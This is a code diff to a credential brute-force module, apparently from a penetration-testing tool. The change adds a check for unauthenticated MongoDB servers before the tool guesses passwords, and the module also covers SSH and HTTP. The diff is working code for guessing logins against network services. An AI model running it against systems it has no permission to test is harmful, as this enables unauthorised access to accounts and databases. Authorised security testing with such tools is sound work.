@@ -96,20 +96,30 @@ class ExternalBrute extends EventEmitter
 					else
 						connection.end()
 						printBrutePass testUser, testPass
-						return
 			when "mongo"
 				MongoClient = require("mongodb").MongoClient
-				MongoClient.connect "mongodb://#{testUser}:#{testPass}@#{target}:#{port}", (err, result) ->
+				# First request to see if the server uses auth (defaut is no).
+				MongoClient.connect "mongodb://#{target}:#{port}/admin", (err, db) ->
 					if err
-						if /auth fails/.exec err
-							Printer.highlight "Last tested combination "
-							Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
-							Printer.removeCursor()
-						else
-							Printer.error "ExternalBrute: Connection problem #{err}"
+						Printer.error "ExternalBrute: Connection problem #{err}"
 					else
-						printBrutePass testUser, testPass
-						return
+						db.collections (err, collections) ->
+							if err
+								if (/not authorized/.exec err)
+									Printer.info "The server is using authentication,\n"
+									Printer.info "starting brute-force ...\n"
+									MongoClient.connect "mongodb://#{testUser}:#{testPass}@#{target}:#{port}", (err, result) ->
+										if err
+											if /auth fails/.exec err
+												Printer.highlight "Last tested combination "
+												Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
+												Printer.removeCursor()
+											else
+												Printer.error "ExternalBrute: Connection problem #{err}"
+										else
+											printBrutePass testUser, testPass
+							else
+								Printer.highlight "The server is not using authentication\n"
 			when "ssh"
 				ssh = require "ssh2"
 				c = new ssh()
@@ -120,7 +130,6 @@ class ExternalBrute extends EventEmitter
 
 				c.on "ready", ->
 					printBrutePass testUser, testPass
-					return
 
 				c.on "error", (err) ->
 					if /Authentication failure/.exec err
@@ -168,7 +177,6 @@ class ExternalBrute extends EventEmitter
 							Printer.error "ExternalBrute: Connection problem #{err}"
 					else
 						printBrutePass testUser, testPass
-						return
 			when "http"
 				request = require "request"
 
